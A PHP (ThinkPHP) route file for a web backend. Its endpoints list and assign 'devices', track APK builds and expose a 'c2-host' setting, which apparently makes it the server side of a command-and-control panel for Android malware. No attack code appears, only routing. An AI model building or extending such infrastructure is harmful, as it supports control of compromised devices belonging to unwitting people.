<?php
use think\facade\Route;

Route::post('api/auth/login', 'AuthController/login');
Route::post('api/auth/login-telegram-verify', 'AuthController/verifyTelegramLogin');
Route::get('api/auth/verify', 'AuthController/verify');
Route::post('api/auth/verify', 'AuthController/verify');
Route::post('api/auth/logout', 'AuthController/logout');
Route::post('api/auth/check-initialization', 'AuthController/checkInitialization');
Route::get('api/system/info', 'AuthController/systemInfo');
Route::get('api/users/login-logs', 'AuthController/loginLogs');
Route::delete('api/users/login-logs', 'AuthController/loginLogs');
Route::post('api/auth/change-password', 'AuthController/changePassword');

Route::get('api/device/list', 'DeviceController/listDevices');
Route::get('api/device/groups', 'DeviceController/listGroups');
Route::get('api/device/:id', 'DeviceController/getDevice');
Route::delete('api/device/:id', 'DeviceController/deleteDevice');
Route::put('api/device/:id/assign', 'DeviceController/assignDevice');
Route::put('api/device/:id/remark', 'DeviceController/setRemark');

Route::get('api/users', 'UserController/listUsers');
Route::post('api/users', 'UserController/addUser');
Route::put('api/users/:id', 'UserController/updateUser');
Route::delete('api/users/:id', 'UserController/deleteUser');

Route::get('api/apk/info', 'ApkController/apkInfo');
Route::get('api/apk/list', 'ApkController/apkList');
Route::get('api/apk/build-status', 'ApkController/apkBuildStatus');
Route::get('api/apk/build-logs', 'ApkController/apkBuildLogs');
Route::get('api/apk/build-history', 'ApkController/apkBuildHistory');
Route::get('api/system/c2-host', 'ApkController/c2Host');

Route::rule('m', 'MApiController/dispatch', 'GET|POST|PUT|DELETE|OPTIONS');
Route::rule('m/:any', 'MApiController/dispatch', 'GET|POST|PUT|DELETE|OPTIONS')->pattern(['any' => '.*']);
